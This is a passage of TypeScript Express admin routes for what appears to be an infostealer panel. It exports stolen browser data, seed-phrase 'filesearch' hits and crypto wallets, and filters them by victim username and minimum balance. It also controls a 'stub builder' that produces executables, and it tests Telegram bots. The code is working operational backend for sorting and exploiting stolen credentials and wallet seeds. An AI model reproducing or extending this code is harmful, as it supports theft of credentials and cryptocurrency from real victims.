    Logger.info('Global announcement created', {
      title,
      message,
      duration_days,
      isPermanent,
      createdBy: req.user!.username,
    });

    res.json({
      message: 'Global announcement created successfully',
      announcement: {
        title,
        message,
        is_permanent: isPermanent,
        expires_at: expiresAt?.toISOString(),
      },
    });
  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Failed to create announcement';
    res.status(500).json({ error: errorMessage });
  }
});

/**
 * DELETE /admin/api/announcements/disable-all
 * Remove/disable all current global announcements
 */
router.delete(
  '/api/announcements/disable-all',
  requireAdmin,
  async (req: AuthenticatedRequest, res) => {
    try {
      await db
        .update(globalAnnouncements)
        .set({ isActive: false })
        .where(eq(globalAnnouncements.isActive, true));

      Logger.info('Global announcements disabled', {
        disabledBy: req.user!.username,
      });

      res.json({ message: 'All global announcements disabled successfully' });
    } catch (error: unknown) {
      const errorMessage =
        error instanceof Error ? error.message : 'Failed to disable announcements';
      res.status(500).json({ error: errorMessage });
    }
  },
);

// Unified export endpoint for new UI - MUST come before the parameterized route
router.get('/api/export/unified', requireAdmin, async (req, res) => {
  try {
    const {
      format,
      sections: sectionsParam,
      username,
      browserKeyword,
      filesearchMinBalance,
      walletsMinBalance,
    } = req.query as {
      format?: 'csv' | 'json' | string;
      sections?: string;
      username?: string;
      browserKeyword?: string;
      filesearchMinBalance?: string | number;
      walletsMinBalance?: string | number;
    };

    // Parse sections parameter
    if (!sectionsParam) {
      return res.status(400).json({ error: 'Sections parameter is required' });
    }

    const selectedSections = sectionsParam
      .toString()
      .split(',')
      .map((s) => s.trim().toLowerCase())
      .filter((s) => ['browser', 'filesearch', 'wallets'].includes(s)) as Array<
      'browser' | 'filesearch' | 'wallets'
    >;

    if (selectedSections.length === 0) {
      return res.status(400).json({ error: 'At least one valid section must be selected' });
    }

    // Get data from all sections
    const allData = await getDashboardSubmissionsAll();
    const browserDataRaw = await getBrowserSubmissionsAll();

    let data: any[] = [];

    // Add selected sections to data array
    if (selectedSections.includes('browser')) {
      data.push(...browserDataRaw.map((item: any) => ({ ...item, section: 'browser' })));
    }
    if (selectedSections.includes('filesearch')) {
      data.push(...allData.filesearch.map((item: any) => ({ ...item, section: 'filesearch' })));
    }
    if (selectedSections.includes('wallets')) {
      data.push(...allData.wallets.map((item: any) => ({ ...item, section: 'wallets' })));
    }

    // Apply username filter
    if (username) {
      data = data.filter(
        (item) =>
          item.username && item.username.toLowerCase().includes(username.toString().toLowerCase()),
      );
    }

    // Apply section-specific filters
    if (browserKeyword) {
      const kw = browserKeyword.toString().toLowerCase();
      data = data.filter((item: any) => {
        if (item.section === 'browser') {
          return JSON.stringify(item).toLowerCase().includes(kw);
        }
        return true;
      });
    }

    // Apply filesearch min balance (only for mnemonicPhrase pattern)
    if (filesearchMinBalance) {
      const minBal = parseFloat(filesearchMinBalance.toString());
      if (!Number.isNaN(minBal)) {
        data = data.filter((item: any) => {
          if (item.section === 'filesearch') {
            try {
              const parsedData = typeof item.data === 'string' ? JSON.parse(item.data) : item.data;
              // Only apply balance filter if this is likely a mnemonicPhrase entry
              if (parsedData?.balance !== undefined) {
                return (parsedData.balance || 0) >= minBal;
              }
            } catch {
              // If parsing fails, keep the item
            }
          }
          return true;
        });
      }
    }

    // Apply wallets min balance
    if (walletsMinBalance) {
      const minBal = parseFloat(walletsMinBalance.toString());
      if (!Number.isNaN(minBal)) {
        data = data.filter((item: any) => {
          if (item.section === 'wallets') {
            return (item.balance_usd || 0) >= minBal;
          }
          return true;
        });
      }
    }

    // Generate filename
    const sectionsText = selectedSections.join('_');
    let filename = `export_${sectionsText}_${new Date().toISOString().split('T')[0]}`;

    const filterParts: string[] = [];
    if (username) filterParts.push(`user_${username}`);
    if (browserKeyword) filterParts.push(`browser_${browserKeyword}`);
    if (filesearchMinBalance) filterParts.push(`fs_minbal_${filesearchMinBalance}`);
    if (walletsMinBalance) filterParts.push(`wallets_minbal_${walletsMinBalance}`);

    if (filterParts.length > 0) {
      filename += `_${filterParts.join('_')}`;
    }

    // Return data
    if (format === 'csv') {
      const csv = convertToCSV(data);
      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', `attachment; filename="${filename}.csv"`);
      res.send(csv);
    } else {
      res.setHeader('Content-Type', 'application/json');
      res.setHeader('Content-Disposition', `attachment; filename="${filename}.json"`);
      res.json(data);
    }
  } catch (error: any) {
    Logger.error('Unified export error', { error: error.message });
    res.status(500).json({ error: error.message });
  }
});

// Export data endpoints
router.get('/api/export/:section', requireAdmin, async (req, res) => {
  try {
    const { section } = req.params;
    const {
      format,
      keyword,
      username,
      minBalance,
      sections: sectionsParam,
      browserKeyword,
      filesearchMinBalance,
      walletsMinBalance,
    } = req.query as {
      format?: 'csv' | 'json' | string;
      keyword?: string;
      username?: string;
      minBalance?: string | number;
      sections?: string;
      browserKeyword?: string;
      filesearchMinBalance?: string | number;
      walletsMinBalance?: string | number;
    };

    let data: any[] = [];
    let filename = '';
    let selectedSections: Array<'browser' | 'filesearch' | 'wallets'> | null = null;
    if (section === 'all' && sectionsParam) {
      const parts = sectionsParam
        .toString()
        .split(',')
        .map((s) => s.trim().toLowerCase())
        .filter((s) => s === 'browser' || s === 'filesearch' || s === 'wallets');
      selectedSections = parts.length
        ? (parts as Array<'browser' | 'filesearch' | 'wallets'>)
        : null;
    }

    switch (section) {
      case 'browser':
        data = await getBrowserSubmissionsAll();
        filename = `browser_data_${new Date().toISOString().split('T')[0]}`;
        break;
      case 'filesearch':
        // Get filesearch data from the combined dashboard API
        const filesearchData = await getDashboardSubmissionsAll();
        data = filesearchData.filesearch;
        filename = `filesearch_data_${new Date().toISOString().split('T')[0]}`;
        break;
      case 'wallets':
        // Get wallets data from the combined dashboard API
        const walletsData = await getDashboardSubmissionsAll();
        data = walletsData.wallets;
        filename = `wallets_data_${new Date().toISOString().split('T')[0]}`;
        break;
      case 'all': {
        const allData = await getDashboardSubmissionsAll();
        let merged = [
          ...allData.browser.map((item: any) => ({ ...item, section: 'browser' })),
          ...allData.filesearch.map((item: any) => ({ ...item, section: 'filesearch' })),
          ...allData.wallets.map((item: any) => ({ ...item, section: 'wallets' })),
        ];
        if (selectedSections) {
          merged = merged.filter((i: any) => selectedSections!.includes(i.section));
        }
        data = merged;
        filename = `all_data_${new Date().toISOString().split('T')[0]}`;
        break;
      }
      default:
        return res
          .status(400)
          .json({ error: 'Invalid section. Must be browser, filesearch, wallets, or all' });
    }

    // Apply filters
    // Keyword filtering
    const effectiveBrowserKeyword = (browserKeyword || keyword)?.toString().trim();
    if (effectiveBrowserKeyword) {
      const kw = effectiveBrowserKeyword.toLowerCase();
      if (section === 'browser') {
        data = data.filter((item) => JSON.stringify(item).toLowerCase().includes(kw));
      } else if (section === 'all') {
        // Only apply keyword filter to browser entries when exporting all
        data = data.filter((item: any) => {
          if (item.section === 'browser') {
            return JSON.stringify(item).toLowerCase().includes(kw);
          }
          return true;
        });
      }
      filename += `_filtered_${kw}`;
    }

    if (username) {
      data = data.filter(
        (item) =>
          item.username && item.username.toLowerCase().includes(username.toString().toLowerCase()),
      );
      filename += `_user_${username}`;
    }

    // Balance filtering
    const minBalAll = minBalance ? parseFloat(minBalance.toString()) : undefined;
    const minBalFilesearch = filesearchMinBalance
      ? parseFloat(filesearchMinBalance.toString())
      : undefined;
    const minBalWallets = walletsMinBalance ? parseFloat(walletsMinBalance.toString()) : undefined;

    const shouldFilterByBalance =
      section === 'wallets' || section === 'filesearch' || section === 'all';
    if (shouldFilterByBalance) {
      data = data.filter((item: any) => {
        // Determine which balance rule applies
        const isWallet = section === 'wallets' || item.section === 'wallets';
        const isFilesearch = section === 'filesearch' || item.section === 'filesearch';

        if (isWallet) {
          const threshold = minBalWallets ?? minBalAll;
          if (typeof threshold === 'number' && !Number.isNaN(threshold)) {
            return (item.balance_usd || 0) >= threshold;
          }
        }

        if (isFilesearch) {
          const threshold = minBalFilesearch ?? minBalAll;
          if (typeof threshold === 'number' && !Number.isNaN(threshold)) {
            try {
              const parsedData = typeof item.data === 'string' ? JSON.parse(item.data) : item.data;
              return (parsedData?.balance || 0) >= threshold;
            } catch {
              return false;
            }
          }
        }

        return true;
      });

      const suffixParts: string[] = [];
      if (minBalWallets) suffixParts.push(`wallets-minbal_${walletsMinBalance}`);
      if (minBalFilesearch) suffixParts.push(`filesearch-minbal_${filesearchMinBalance}`);
      if (!suffixParts.length && minBalance) suffixParts.push(`minbal_${minBalance}`);
      if (suffixParts.length) filename += `_${suffixParts.join('_')}`;
    }

    if (format === 'csv') {
      const csv = convertToCSV(data);
      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', `attachment; filename="${filename}.csv"`);
      res.send(csv);
    } else {
      res.setHeader('Content-Type', 'application/json');
      res.setHeader('Content-Disposition', `attachment; filename="${filename}.json"`);
      res.json(data);
    }
  } catch (error: any) {
    Logger.error('Export error', { error: error.message });
    res.status(500).json({ error: error.message });
  }
});

// Helper function to convert data to CSV
function convertToCSV(data: any[]): string {
  if (data.length === 0) return '';

  const headers = Object.keys(data[0]);
  const csvHeaders = headers.join(',');

  const csvRows = data.map((row) => {
    return headers
      .map((header) => {
        const value = row[header];
        if (value === null || value === undefined) return '';
        if (typeof value === 'object') return `"${JSON.stringify(value).replace(/"/g, '""')}"`;
        return `"${value.toString().replace(/"/g, '""')}"`;
      })
      .join(',');
  });

  return [csvHeaders, ...csvRows].join('\n');
}

// Stub Builder Configuration Routes

// Helper function to map service config (camelCase) to API format (snake_case)
function mapConfigToApiFormat(config: any) {
  return {
    builds_enabled: config.buildsEnabled,
    build_cooldown_seconds: config.buildCooldownSeconds,
  };
}

// Get stub builder configuration
router.get('/api/stub-builder/config', requireAdmin, async (_req, res) => {
  try {
    const config = await StubBuilderConfigService.getConfig();
    res.json({ config: mapConfigToApiFormat(config) });
  } catch (error: any) {
    Logger.error('Failed to get stub builder config:', error);
    res.status(500).json({ error: 'Failed to get configuration' });
  }
});

// Update stub builder configuration
router.put('/api/stub-builder/config', requireAdmin, async (req, res) => {
  try {
    const { builds_enabled, build_cooldown_seconds } = req.body;

    const updates: any = {};

    if (typeof builds_enabled === 'boolean') {
      updates.buildsEnabled = builds_enabled;
    }

    if (typeof build_cooldown_seconds === 'number') {
      if (build_cooldown_seconds < 0) {
        return res.status(400).json({ error: 'Cooldown cannot be negative' });
      }
      if (build_cooldown_seconds > 3600) {
        return res.status(400).json({ error: 'Cooldown cannot exceed 1 hour (3600 seconds)' });
      }
      updates.buildCooldownSeconds = build_cooldown_seconds;
    }

    if (Object.keys(updates).length === 0) {
      return res.status(400).json({ error: 'No valid updates provided' });
    }

    await StubBuilderConfigService.updateConfig(updates);
    const updatedConfig = await StubBuilderConfigService.getConfig();

    res.json({
      message: 'Configuration updated successfully',
      config: mapConfigToApiFormat(updatedConfig),
    });
  } catch (error: any) {
    Logger.error('Failed to update stub builder config:', error);
    res.status(500).json({ error: 'Failed to update configuration' });
  }
});

// Toggle builds on/off
router.post('/api/stub-builder/toggle', requireAdmin, async (req, res) => {
  try {
    const { enabled } = req.body;

    if (typeof enabled !== 'boolean') {
      return res.status(400).json({ error: 'enabled must be a boolean' });
    }

    await StubBuilderConfigService.toggleBuilds(enabled);
    const config = await StubBuilderConfigService.getConfig();

    res.json({
      message: `Builds ${enabled ? 'enabled' : 'disabled'} successfully`,
      config: mapConfigToApiFormat(config),
    });
  } catch (error: any) {
    Logger.error('Failed to toggle stub builder:', error);
    res.status(500).json({ error: 'Failed to toggle builds' });
  }
});

// Reset configuration to defaults
router.post('/api/stub-builder/reset', requireAdmin, async (_req, res) => {
  try {
    await StubBuilderConfigService.resetToDefault();
    const config = await StubBuilderConfigService.getConfig();

    res.json({
      message: 'Configuration reset to defaults',
      config: mapConfigToApiFormat(config),
    });
  } catch (error: any) {
    Logger.error('Failed to reset stub builder config:', error);
    res.status(500).json({ error: 'Failed to reset configuration' });
  }
});

// Clean up all build files and executables
router.post('/api/stub-builder/cleanup', requireAdmin, async (_req, res) => {
  try {
    const result = await StubBuilderConfigService.cleanupAllFiles();

    res.json({
      message: `Successfully cleaned up ${result.filesDeleted} files from ${result.directoriesCleared.join(', ')} directories`,
      filesDeleted: result.filesDeleted,
      directoriesCleared: result.directoriesCleared,
    });
  } catch (error: any) {
    Logger.error('Failed to cleanup stub builder files:', error);
    res.status(500).json({ error: 'Failed to cleanup files' });
  }
});

// Get build system cache status
router.get('/api/stub-builder/cache-status', requireAdmin, async (_req, res) => {
  try {
    const buildSystemStatus = StubBuilderService.isBuildSystemReady();
    const cacheStatus = StubBuilderService.getCacheStatus();

    res.json({
      buildSystemReady: buildSystemStatus.ready,
      message: buildSystemStatus.message || 'Build system is ready',
      cacheReady: cacheStatus.ready,
      cachePath: cacheStatus.path,
      isResetInProgress: cacheStatus.isResetInProgress,
      isRetryInProgress: cacheStatus.isRetryInProgress,
      resetElapsedSeconds: cacheStatus.resetElapsedSeconds,
      retryElapsedSeconds: cacheStatus.retryElapsedSeconds,
    });
  } catch (error: any) {
    Logger.error('Failed to get cache status:', error);
    res.status(500).json({ error: 'Failed to get cache status' });
  }
});

// Reset build cache (force rebuild dependencies)
router.post('/api/stub-builder/reset-cache', requireAdmin, async (_req, res) => {
  try {
    Logger.info('Admin requested build cache reset');
    await StubBuilderService.clearBuildCache();
    const cacheStatus = StubBuilderService.getCacheStatus();

    res.json({
      message: 'Build cache reset successfully. Dependencies will be recompiled on next build.',
      cacheReady: cacheStatus.ready,
      cachePath: cacheStatus.path,
      isResetInProgress: cacheStatus.isResetInProgress,
      isRetryInProgress: cacheStatus.isRetryInProgress,
      resetElapsedSeconds: cacheStatus.resetElapsedSeconds,
      retryElapsedSeconds: cacheStatus.retryElapsedSeconds,
    });
  } catch (error: any) {
    Logger.error('Failed to reset build cache:', error);
    res.status(500).json({
      error: 'Failed to reset build cache',
      details: error.message || 'Unknown error occurred',
      stack: error.stack || null,
    });
  }
});

// Retry cache initialization if it failed
router.post('/api/stub-builder/retry-cache', requireAdmin, async (_req, res) => {
  try {
    Logger.info('Admin requested cache initialization retry');
    const success = await StubBuilderService.retryCacheInitialization();
    const cacheStatus = StubBuilderService.getCacheStatus();

    if (success) {
      res.json({
        message: 'Cache initialization retry successful. Build system is now ready.',
        cacheReady: cacheStatus.ready,
        cachePath: cacheStatus.path,
        isResetInProgress: cacheStatus.isResetInProgress,
        isRetryInProgress: cacheStatus.isRetryInProgress,
        resetElapsedSeconds: cacheStatus.resetElapsedSeconds,
        retryElapsedSeconds: cacheStatus.retryElapsedSeconds,
      });
    } else {
      res.status(500).json({
        error: 'Cache initialization retry failed. Check logs for details.',
        cacheReady: cacheStatus.ready,
        cachePath: cacheStatus.path,
        isResetInProgress: cacheStatus.isResetInProgress,
        isRetryInProgress: cacheStatus.isRetryInProgress,
        resetElapsedSeconds: cacheStatus.resetElapsedSeconds,
        retryElapsedSeconds: cacheStatus.retryElapsedSeconds,
      });
    }
  } catch (error: any) {
    Logger.error('Failed to retry cache initialization:', error);
    res.status(500).json({ error: 'Failed to retry cache initialization' });
  }
});

// Test telegram bot
router.post('/api/telegram/test', requireAdmin, async (req, res) => {
  try {
    const { message } = req.body || {};
    if (!message) {
      return res.status(400).json({ error: 'Test message is required' });
    }

    const config = await TelegramService.getConfig();
    if (!config.bot_token || !config.notifications_enabled) {
      return res.status(400).json({ error: 'Telegram bot is not configured or enabled' });
    }

    // Send test message
    const success = await TelegramService.sendMessage(message);

    if (success) {
      res.json({ success: true, message: 'Test message sent successfully' });
    } else {
      res.status(500).json({ error: 'Failed to send test message' });
    }
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to test telegram bot' });
  }
});

// Test reset bot
router.post('/api/reset-bot/test', requireAdmin, async (req, res) => {
  try {
    const { message } = req.body || {};
    if (!message) {
      return res.status(400).json({ error: 'Test message is required' });
    }

    const config = await TelegramResetService.getConfig();
    if (!config.bot_token || !config.enabled) {
      return res.status(400).json({ error: 'Reset bot is not configured or enabled' });
    }

    // Test the reset bot token
    const testResult = await TelegramResetService.testToken(config.bot_token);

    if (testResult.success) {
      res.json({
        success: true,
        message: 'Reset bot is working correctly',
        username: testResult.username,
      });
    } else {
      res.status(500).json({ error: testResult.error || 'Reset bot test failed' });
    }
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to test reset bot' });
  }
});

// Data export management
router.get('/api/export/stats', requireAdmin, async (_req, res) => {
  try {
    const stats: any = {};

    try {
      // Get all counts in parallel using Drizzle
      const [usersCount, subscriptionsCount, submissionsCount, announcementsCount] =
        await Promise.all([
          db.select({ count: sql<number>`count(*)` }).from(users),
          // Note: subscriptions and submissions tables need to be imported from schema
          // For now, setting to 0 as these may be handled by other services
          Promise.resolve([{ count: 0 }]),
          Promise.resolve([{ count: 0 }]),
          db.select({ count: sql<number>`count(*)` }).from(globalAnnouncements),
        ]);

      stats.total_users = usersCount[0]?.count || 0;
      stats.total_subscriptions = subscriptionsCount[0]?.count || 0;
      stats.total_submissions = submissionsCount[0]?.count || 0;
      stats.total_announcements = announcementsCount[0]?.count || 0;

      // Add database size and last backup info
      stats.database_size = 'Unknown';
      stats.last_backup = null;

      res.json({ stats });
    } catch (dbError: any) {
      throw new Error(`Database query failed: ${dbError.message}`);
    }
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to get export stats' });
  }
});

router.post('/api/export/data', requireAdmin, async (req, res) => {
  try {
    const { format, dataTypes, filters } = req.body || {};

    if (!format || !dataTypes || !Array.isArray(dataTypes)) {
      return res.status(400).json({ error: 'Format and dataTypes are required' });
    }

    const data: any = {};

    try {
      // Export users if requested
      if (dataTypes.includes('users')) {
        data.users = await db
          .select({
            id: users.id,
            username: users.username,
            created_at: users.createdAt,
            is_admin: users.isAdmin,
          })
          .from(users);
      }

      // Export subscriptions if requested
      if (dataTypes.includes('subscriptions')) {
        // Note: subscriptions table needs to be imported from schema
        // For now, returning empty array as this may be handled by SubscriptionService
        data.subscriptions = [];
      }

      // Export submissions if requested
      if (dataTypes.includes('submissions')) {
        // Note: submissions table needs to be imported from schema
        // For now, returning empty array as this may be handled by SubmissionService
        data.submissions = [];
      }

      // Export announcements if requested
      if (dataTypes.includes('announcements')) {
        data.announcements = await db.select().from(globalAnnouncements);
      }

      // Return the data
      if (format === 'json') {
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', 'attachment; filename="admin_export.json"');
        res.json(data);
      } else {
        res.status(400).json({ error: 'Unsupported format' });
      }
    } catch (dbError: any) {
      throw new Error(`Database query failed: ${dbError.message}`);
    }
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to export data' });
  }
});

// Legacy-compatible unified export endpoint
router.get('/api/export/unified', requireAdmin, async (req, res) => {
  try {
    const {
      format = 'json',
      sections,
      username,
      browserKeyword,
      filesearchMinBalance,
      walletsMinBalance,
    } = req.query;

    if (!sections) {
      return res.status(400).json({ error: 'Sections parameter is required' });
    }

    const sectionList = (sections as string).split(',');
    const data: any = {};

    try {
      // Use existing service functions instead of raw SQL queries

      // Export browser data if requested
      if (sectionList.includes('browser')) {
        let browserData = await getBrowserSubmissionsAll();

        // Apply filters
        if (username) {
          browserData = browserData.filter(
            (item: any) =>
              item.username &&
              item.username.toLowerCase().includes(username.toString().toLowerCase()),
          );
        }

        if (browserKeyword) {
          const kw = browserKeyword.toString().toLowerCase();
          browserData = browserData.filter((item: any) =>
            JSON.stringify(item).toLowerCase().includes(kw),
          );
        }

        data.browser = browserData;
      }

      // Export filesearch data if requested
      if (sectionList.includes('filesearch')) {
        const allData = await getDashboardSubmissionsAll();
        let filesearchData = allData.filesearch;

        // Apply filters
        if (username) {
          filesearchData = filesearchData.filter(
            (item: any) =>
              item.username &&
              item.username.toLowerCase().includes(username.toString().toLowerCase()),
          );
        }

        if (filesearchMinBalance) {
          const minBal = parseFloat(filesearchMinBalance.toString());
          if (!isNaN(minBal)) {
            filesearchData = filesearchData.filter((item: any) => {
              try {
                const parsedData =
                  typeof item.data === 'string' ? JSON.parse(item.data) : item.data;
                return (parsedData?.balance || 0) >= minBal;
              } catch {
                return false;
              }
            });
          }
        }

        data.filesearch = filesearchData;
      }

      // Export wallet data if requested
      if (sectionList.includes('wallets')) {
        const allData = await getDashboardSubmissionsAll();
        let walletsData = allData.wallets;

        // Apply filters
        if (username) {
          walletsData = walletsData.filter(
            (item: any) =>
              item.username &&
              item.username.toLowerCase().includes(username.toString().toLowerCase()),
          );
        }

        if (walletsMinBalance) {
          const minBal = parseFloat(walletsMinBalance.toString());
          if (!isNaN(minBal)) {
            walletsData = walletsData.filter((item: any) => (item.balance_usd || 0) >= minBal);
          }
        }

        data.wallets = walletsData;
      }

      // Return the data
      if (format === 'json') {
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', 'attachment; filename="admin_export_unified.json"');
        res.json(data);
      } else if (format === 'csv') {
        // For CSV, we'll return JSON for now but with CSV content-type
        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename="admin_export_unified.csv"');
        // Convert to CSV format - simplified for now
        let csvContent = '';
        Object.entries(data).forEach(([section, rows]) => {
          csvContent += `\n\n=== ${section.toUpperCase()} ===\n`;
          if (Array.isArray(rows) && rows.length > 0) {
            const headers = Object.keys(rows[0]);
            csvContent += headers.join(',') + '\n';
            rows.forEach((row) => {
              const values = headers.map((header) => {
                const value = row[header];
                return typeof value === 'string' && value.includes(',') ? `"${value}"` : value;
              });
              csvContent += values.join(',') + '\n';
            });
          }
        });
        res.send(csvContent);
      } else {
        res.status(400).json({ error: 'Unsupported format. Use json or csv' });
      }
    } catch (dbError: any) {
      throw new Error(`Database query failed: ${dbError.message}`);
    }
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to export unified data' });
  }
});

// Individual section export endpoints (legacy compatibility)
router.get('/api/export/:section', requireAdmin, async (req, res) => {
  try {
    const { section } = req.params;
    const { format = 'json' } = req.query;

    if (!['browser', 'filesearch', 'wallets', 'all'].includes(section)) {
      return res
        .status(400)
        .json({ error: 'Invalid section. Must be browser, filesearch, wallets, or all' });
    }

    const data: any = {};

    try {
      // Use existing service functions instead of raw SQL queries

      if (section === 'browser' || section === 'all') {
        data.browser = await getBrowserSubmissionsAll();
      }

      if (section === 'filesearch' || section === 'all') {
        const allData = await getDashboardSubmissionsAll();
        data.filesearch = allData.filesearch;
      }

      if (section === 'wallets' || section === 'all') {
        const allData = await getDashboardSubmissionsAll();
        data.wallets = allData.wallets;
      }

      // Return the data
      if (format === 'json') {
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', `attachment; filename="admin_export_${section}.json"`);
        res.json(data);
      } else {
        res.status(400).json({ error: 'Unsupported format' });
      }
    } catch (dbError: any) {
      throw new Error(`Database query failed: ${dbError.message}`);
    }
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to export section data' });
  }
});

// Announcements management
router.get('/api/announcements', requireAdmin, async (_req, res) => {
  try {
    const announcements = await db
      .select()
      .from(globalAnnouncements)
      .orderBy(desc(globalAnnouncements.createdAt));

    res.json({ announcements });
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to fetch announcements' });
  }
});

router.post('/api/announcements', requireAdmin, async (req: AuthenticatedRequest, res) => {
  try {
    const { title, message, duration_days } = req.body || {};
    if (!title || !message) {
      return res.status(400).json({ error: 'Title and message are required' });
    }

    // Deactivate existing announcements first
    await db
      .update(globalAnnouncements)
      .set({ isActive: false })
      .where(eq(globalAnnouncements.isActive, true));

    // Create new announcement
    const isPermanent = !duration_days || duration_days === 0;
    const expiresAt = isPermanent
      ? null
      : new Date(Date.now() + duration_days * 24 * 60 * 60 * 1000);

    const result = await db
      .insert(globalAnnouncements)
      .values({
        title,
        message,
        isActive: true,
        isPermanent,
        expiresAt,
        createdBy: req.user!.id,
      })
      .returning();

    res.status(201).json({
      message: 'Announcement created successfully',
      announcement: result[0],
    });
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to create announcement' });
  }
});

router.put('/api/announcements/:id', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const { title, message, isActive } = req.body || {};

    if (!id || isNaN(parseInt(id))) {
      return res.status(400).json({ error: 'Valid announcement ID is required' });
    }

    const updateData: any = { updatedAt: new Date() };
    if (title !== undefined) updateData.title = title;
    if (message !== undefined) updateData.message = message;
    if (isActive !== undefined) updateData.isActive = Boolean(isActive);

    const result = await db
      .update(globalAnnouncements)
      .set(updateData)
      .where(eq(globalAnnouncements.id, parseInt(id)))
      .returning();

    if (result.length === 0) {
      return res.status(404).json({ error: 'Announcement not found' });
    }

    res.json({
      message: 'Announcement updated successfully',
      announcement: result[0],
    });
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to update announcement' });
  }
});

router.delete('/api/announcements/:id', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    if (!id || isNaN(parseInt(id))) {
      return res.status(400).json({ error: 'Valid announcement ID is required' });
    }

    const result = await db
      .delete(globalAnnouncements)
      .where(eq(globalAnnouncements.id, parseInt(id)))
      .returning();

    if (result.length === 0) {
      return res.status(404).json({ error: 'Announcement not found' });
    }

    res.json({ message: 'Announcement deleted successfully' });
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to delete announcement' });
  }
});

export default router;
